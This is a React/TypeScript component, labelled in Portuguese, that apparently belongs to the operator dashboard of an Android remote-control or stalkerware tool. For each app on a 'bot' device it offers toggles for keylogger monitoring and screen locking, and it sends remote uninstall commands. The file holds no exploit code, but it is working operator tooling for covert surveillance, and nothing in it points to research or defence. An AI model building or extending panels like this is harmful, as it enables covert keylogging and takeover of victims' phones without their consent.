import React, { useState } from 'react';
import type { Bot } from '../types';
import { StorageService } from '../services/storage';

interface AppManagerProps {
  bot: Bot;
}

export const AppManager: React.FC<AppManagerProps> = ({ bot }) => {
  const [search, setSearch] = useState('');
  const [appType, setAppType] = useState<'all' | 'user' | 'system'>('all');

  const apps = StorageService.getApps(bot.id);

  const filteredApps = apps.filter(app => {
    const matchesSearch = app.appName.toLowerCase().includes(search.toLowerCase()) || 
                          app.packageName.toLowerCase().includes(search.toLowerCase());
    
    if (appType === 'user') return matchesSearch && !app.isSystem;
    if (appType === 'system') return matchesSearch && app.isSystem;
    return matchesSearch;
  });

  const handleToggleLock = (packageName: string) => {
    StorageService.toggleAppLock(bot.id, packageName);
  };

  const handleToggleTracking = (packageName: string) => {
    StorageService.toggleAppTracking(bot.id, packageName);
  };

  const handleUninstall = (packageName: string, appName: string) => {
    StorageService.addLog('warning', `Comando de desinstalação enviado para ${appName}`, bot.id, bot.name);
    alert(`Comando de desinstalação enviado para o pacote: ${packageName}`);
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px', padding: '16px' }}>
      
      {/* Filtering tools */}
      <div className="glass-panel" style={{ padding: '16px', display: 'flex', gap: '12px', flexWrap: 'wrap', alignItems: 'center' }}>
        <input 
          type="text" 
          placeholder="Buscar aplicativo ou pacote..." 
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          style={{ flex: 1, minWidth: '200px', fontSize: '14px' }}
        />
        <select 
          value={appType} 
          onChange={(e) => setAppType(e.target.value as any)}
          style={{ fontSize: '14px', minWidth: '150px' }}
        >
          <option value="all">Todos os Apps</option>
          <option value="user">Instalados pelo Usuário</option>
          <option value="system">Aplicativos de Sistema</option>
        </select>
      </div>

      {/* Apps Grid */}
      <div className="glass-panel" style={{ padding: '20px' }}>
        <div style={{ overflowX: 'auto' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '14px' }}>
            <thead>
              <tr style={{ borderBottom: '1px solid var(--border-color)', color: 'var(--text-secondary)' }}>
                <th style={{ padding: '12px 8px' }}>Aplicativo</th>
                <th style={{ padding: '12px 8px' }}>Pacote</th>
                <th style={{ padding: '12px 8px' }}>Tipo</th>
                <th style={{ padding: '12px 8px', textAlign: 'center' }}>Monitorar Keylogger</th>
                <th style={{ padding: '12px 8px', textAlign: 'center' }}>Bloqueio de Tela</th>
                <th style={{ padding: '12px 8px', textAlign: 'right' }}>Ações</th>
              </tr>
            </thead>
            <tbody>
              {filteredApps.map(app => (
                <tr key={app.packageName} style={{ borderBottom: '1px solid rgba(255, 255, 255, 0.03)' }}>
                  {/* Name */}
                  <td style={{ padding: '12px 8px', fontWeight: '500', color: 'var(--text-primary)' }}>
                    {app.appName}
                  </td>
                  
                  {/* Package */}
                  <td style={{ padding: '12px 8px', fontFamily: 'var(--font-mono)', fontSize: '12px', color: 'var(--accent-cyan)' }}>
                    {app.packageName}
                  </td>
                  
                  {/* Type */}
                  <td style={{ padding: '12px 8px' }}>
                    <span style={{ 
                      fontSize: '11px', 
                      background: app.isSystem ? 'rgba(255,255,255,0.05)' : 'rgba(139,92,246,0.1)', 
                      color: app.isSystem ? 'var(--text-secondary)' : 'var(--accent-purple)',
                      padding: '2px 6px',
                      borderRadius: '4px',
                      fontWeight: '500'
                    }}>
                      {app.isSystem ? 'SISTEMA' : 'USUÁRIO'}
                    </span>
                  </td>

                  {/* Tracking toggle */}
                  <td style={{ padding: '12px 8px', textAlign: 'center' }}>
                    <input 
                      type="checkbox" 
                      checked={app.tracked}
                      onChange={() => handleToggleTracking(app.packageName)}
                      style={{ cursor: 'pointer', transform: 'scale(1.2)' }}
                    />
                  </td>

                  {/* Lock toggle */}
                  <td style={{ padding: '12px 8px', textAlign: 'center' }}>
                    <button 
                      onClick={() => handleToggleLock(app.packageName)}
                      style={{
                        padding: '4px 10px',
                        fontSize: '11px',
                        borderRadius: '4px',
                        background: app.locked ? 'var(--danger)' : 'var(--bg-tertiary)',
                        color: 'white',
                        border: app.locked ? 'none' : '1px solid var(--border-color)',
                      }}
                    >
                      {app.locked ? '🔒 BLOQUEADO' : '🔓 DESBLOQUEADO'}
                    </button>
                  </td>

                  {/* Actions */}
                  <td style={{ padding: '12px 8px', textAlign: 'right' }}>
                    <button 
                      className="btn btn-secondary" 
                      onClick={() => handleUninstall(app.packageName, app.appName)}
                      disabled={app.isSystem}
                      style={{ 
                        padding: '4px 8px', 
                        fontSize: '12px', 
                        color: 'var(--danger)',
                        opacity: app.isSystem ? 0.4 : 1
                      }}
                    >
                      Desinstalar
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

    </div>
  );
};
